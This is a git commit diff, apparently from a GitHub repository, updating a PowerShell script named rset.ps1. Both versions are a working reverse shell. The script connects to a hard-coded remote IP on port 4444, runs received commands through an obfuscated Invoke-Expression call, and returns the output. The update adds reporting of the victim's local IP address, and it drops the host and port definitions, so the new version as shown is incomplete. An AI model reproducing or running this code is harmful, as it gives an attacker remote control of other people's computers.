72125cba1d6a8d983c14323c54feed7807ec16ea
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 02:54:31 +0530

    Update rset.ps1

--- rset.ps1
+++ rset.ps1
@@ -1,11 +1,14 @@
 $h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
-$i = "134.209.113.62";$p = 4444
-$c=New-Object ($h) ($i,$p);$s=$c.GetStream()
-$b=0..65535|%{0}
-while(($r=$s.Read($b,0,$b.Length)) -ne 0){
-$d=(New-Object ($a)).GetString($b,0,$r)
-$t=&('ie'+'x') $d 2>&1 | Out-String
-$t2=$t + ('PS ' + (pwd).Path + '> ')
-$m=[Text.Encoding]::ASCII.GetBytes($t2)
-$s.Write($m,0,$m.Length);$s.Flush()
-};$c.Close()
+$ipAddr = ([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).ToString()
+$c = New-Object ($h) ($i, $p)
+$s = $c.GetStream()
+$b = 0..65535 | % { 0 }
+while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
+    $d = (New-Object ($a)).GetString($b, 0, $r)
+    $t = &('ie' + 'x') $d 2>&1 | Out-String
+    $t2 = "[$ipAddr]`n$t`nPS " + (pwd).Path + "> "
+    $m = [Text.Encoding]::ASCII.GetBytes($t2)
+    $s.Write($m, 0, $m.Length)
+    $s.Flush()
+}
+$c.Close()
